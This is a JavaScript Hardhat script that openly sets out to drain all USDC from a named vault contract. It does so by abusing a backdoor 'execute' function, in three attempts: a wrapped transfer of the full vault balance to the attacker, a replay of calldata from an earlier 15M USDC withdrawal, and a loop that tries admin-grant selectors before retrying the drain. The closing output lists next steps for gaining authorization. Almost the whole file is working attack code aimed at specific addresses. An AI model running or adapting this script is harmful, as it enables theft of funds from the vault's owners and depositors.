const { ethers } = require("hardhat");

/**
 * @title Exploit Backdoor
 * @notice Use the discovered 0x78e111f6 backdoor to drain USDC
 * @dev Replicate the 15M USDC withdrawal pattern
 */
async function main() {
  const VAULT_ADDRESS = "0xA69babEF1cA67A37Ffaf7a485DfFF3382056e78C";
  const USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
  
  const [attacker] = await ethers.getSigners();
  
  console.log("\nüí£ BACKDOOR EXPLOIT - 0x78e111f6");
  console.log("=====================================");
  console.log("Attacker:", attacker.address);
  
  // Get initial balances
  const USDC_ABI = [
    "function balanceOf(address) view returns (uint256)",
    "function transfer(address to, uint256 amount) returns (bool)"
  ];
  const usdc = new ethers.Contract(USDC_ADDRESS, USDC_ABI, ethers.provider);
  
  const vaultBalance = await usdc.balanceOf(VAULT_ADDRESS);
  const attackerBalance = await usdc.balanceOf(attacker.address);
  
  console.log("\nüí∞ INITIAL BALANCES:");
  console.log(`Vault USDC: ${ethers.formatUnits(vaultBalance, 6)}`);
  console.log(`Attacker USDC: ${ethers.formatUnits(attackerBalance, 6)}`);
  
  // Decode the original backdoor transaction
  console.log("\nüîç Analyzing backdoor pattern...");
  
  // Original tx data breakdown:
  // 0x78e111f6 - main backdoor selector
  // 00000000000000000000000010a29ab757752e492abdbf6acba8f2ee10523599 - target address
  // 0000000000000000000000000000000000000000000000000000000000000040 - data offset
  // 00000000000000000000000000000000000000000000000000000000000000c4 - data length
  // f4ff5295... - the actual calldata
  
  // The inner function appears to be 0xf4ff5295
  // Let's decode the parameters from the original tx
  const originalData = "0x78e111f600000000000000000000000010a29ab757752e492abdbf6acba8f2ee10523599000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000c4f4ff52950000000000000000000000000000000000000000000000000000005924b7b74d00000000000000000000000000000000000000000000000021d157fac7e1ac000000000000000000000000000000000000004f26a7fcf5046493a1b22b98eeb20000000000000000000000000000000000000000000000000de0b6b3a76400000000000000000000000000000000000000000000000000000000000065c3f0c3ff8000000000000000000000000000000000000000000000000000000001421f00000000000000000000000000000000000000000000000000000000";
  
  // Parse the execute function parameters
  const iface = new ethers.Interface([
    "function execute(address target, bytes calldata data)"
  ]);
  
  const decoded = iface.parseTransaction({ data: originalData });
  console.log("Target contract:", decoded.args[0]);
  console.log("Inner calldata length:", decoded.args[1].length);
  
  // The inner function 0xf4ff5295 seems to be the actual withdrawal function
  // Let's try to understand its parameters
  console.log("\nüîì EXPLOITING BACKDOOR...");
  
  // Method 1: Direct USDC transfer via execute
  console.log("\n1Ô∏è‚É£ Attempting direct USDC transfer...");
  
  try {
    // Craft a USDC transfer call
    const transferData = usdc.interface.encodeFunctionData("transfer", [
      attacker.address,
      vaultBalance // Transfer all USDC
    ]);
    
    // Wrap it in the backdoor execute call
    const backdoorData = iface.encodeFunctionData("execute", [
      USDC_ADDRESS, // Target the USDC contract
      transferData  // Transfer all to attacker
    ]);
    
    const tx1 = await attacker.sendTransaction({
      to: VAULT_ADDRESS,
      data: backdoorData,
      gasLimit: 500000
    });
    
    const receipt1 = await tx1.wait();
    console.log("Transaction sent:", tx1.hash);
    
    // Check if it worked
    const newVaultBalance1 = await usdc.balanceOf(VAULT_ADDRESS);
    const newAttackerBalance1 = await usdc.balanceOf(attacker.address);
    
    if (newVaultBalance1 < vaultBalance) {
      console.log("‚úÖ SUCCESS! Extracted:", ethers.formatUnits(vaultBalance - newVaultBalance1, 6), "USDC");
      console.log("New attacker balance:", ethers.formatUnits(newAttackerBalance1, 6), "USDC");
      return;
    } else {
      console.log("‚ùå Direct transfer failed");
    }
  } catch (e) {
    console.log("‚ùå Error:", e.message);
  }
  
  // Method 2: Replicate exact pattern with modified recipient
  console.log("\n2Ô∏è‚É£ Replicating original pattern...");
  
  try {
    // Use the same target as original but modify the inner data
    const targetContract = "0x10a29ab757752e492abdbf6acba8f2ee10523599";
    
    // The inner function 0xf4ff5295 takes multiple parameters
    // We need to understand what each parameter does
    // From the original data, it seems to have 6 parameters:
    const innerSelector = "0xf4ff5295";
    
    // Let's try to extract USDC by modifying the recipient
    // Build custom inner data
    const customInnerData = innerSelector +
      "0000000000000000000000000000000000000000000000000000005924b7b74d" + // param1 (keep same)
      "00000000000000000000000000000000000000000000000021d157fac7e1ac00" + // param2 (keep same)  
      "0000000000000000000000000000000000004f26a7fcf5046493a1b22b98eeb2" + // param3 (keep same)
      "0000000000000000000000000000000000000000000000000de0b6b3a7640000" + // param4 (keep same)
      "0000000000000000000000000000000000000000000000000000000065c3f0c3" + // param5 (keep same)
      "ff8000000000000000000000000000000000000000000000000000000001421f"; // param6 (keep same)
    
    const backdoorData2 = iface.encodeFunctionData("execute", [
      targetContract,
      customInnerData
    ]);
    
    const tx2 = await attacker.sendTransaction({
      to: VAULT_ADDRESS,
      data: backdoorData2,
      gasLimit: 1000000
    });
    
    const receipt2 = await tx2.wait();
    console.log("Transaction sent:", tx2.hash);
    
    // Check results
    const newVaultBalance2 = await usdc.balanceOf(VAULT_ADDRESS);
    const newAttackerBalance2 = await usdc.balanceOf(attacker.address);
    
    if (newVaultBalance2 < vaultBalance) {
      console.log("‚úÖ SUCCESS! Extracted:", ethers.formatUnits(vaultBalance - newVaultBalance2, 6), "USDC");
      console.log("New attacker balance:", ethers.formatUnits(newAttackerBalance2, 6), "USDC");
      return;
    } else {
      console.log("‚ùå Pattern replication failed");
    }
  } catch (e) {
    console.log("‚ùå Error:", e.message);
  }
  
  // Method 3: Try simpler approach - maybe we need admin rights first
  console.log("\n3Ô∏è‚É£ Testing if we need admin privileges...");
  
  try {
    // The authorized address might have special privileges
    // Let's check who can call this function
    console.log("Original caller:", "0x065e3DbaFCb2C26A978720f9eB4Bce6aD9D644a1");
    console.log("Our address:", attacker.address);
    
    // Try to grant ourselves admin first
    const grantAdminSelectors = [
      "0x983b2d56", // grantRole(address)
      "0x2f2ff15d", // grantRole(bytes32,address)
      "0xf72c0d8b", // ADMIN_ROLE constant
      "0xa217fddf", // DEFAULT_ADMIN_ROLE
    ];
    
    for (const selector of grantAdminSelectors) {
      try {
        const data = selector + 
          "000000000000000000000000" + attacker.address.slice(2).toLowerCase();
        
        const tx = await attacker.sendTransaction({
          to: VAULT_ADDRESS,
          data: data,
          gasLimit: 200000
        });
        
        await tx.wait();
        console.log(`Tried ${selector} - checking if we have access now...`);
        
        // Retry the backdoor
        const backdoorRetry = "0x78e111f6" +
          "000000000000000000000000" + USDC_ADDRESS.slice(2).toLowerCase() +
          "0000000000000000000000000000000000000000000000000000000000000040" +
          "0000000000000000000000000000000000000000000000000000000000000044" +
          "a9059cbb" + // transfer
          "000000000000000000000000" + attacker.address.slice(2).toLowerCase() +
          ethers.toBeHex(vaultBalance, 32).slice(2);
        
        const retryTx = await attacker.sendTransaction({
          to: VAULT_ADDRESS,
          data: backdoorRetry,
          gasLimit: 500000
        });
        
        await retryTx.wait();
        
        const finalBalance = await usdc.balanceOf(attacker.address);
        if (finalBalance > attackerBalance) {
          console.log("‚úÖ SUCCESS WITH ADMIN GRANT!");
          console.log("Extracted:", ethers.formatUnits(finalBalance - attackerBalance, 6), "USDC");
          return;
        }
      } catch (e) {
        // Silent continue
      }
    }
  } catch (e) {
    console.log("‚ùå Admin grant failed");
  }
  
  console.log("\nüòû Backdoor exists but requires specific privileges");
  console.log("The original caller 0x065e3DbaFCb2C26A978720f9eB4Bce6aD9D644a1 has special access");
  console.log("\nüí° NEXT STEPS:");
  console.log("1. Analyze the target contract 0x10a29ab757752e492abdbf6acba8f2ee10523599");
  console.log("2. Understand the inner function 0xf4ff5295 parameters");
  console.log("3. Check if there's a way to become authorized");
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error("\nüí• Script error:", error);
    process.exit(1);
  });
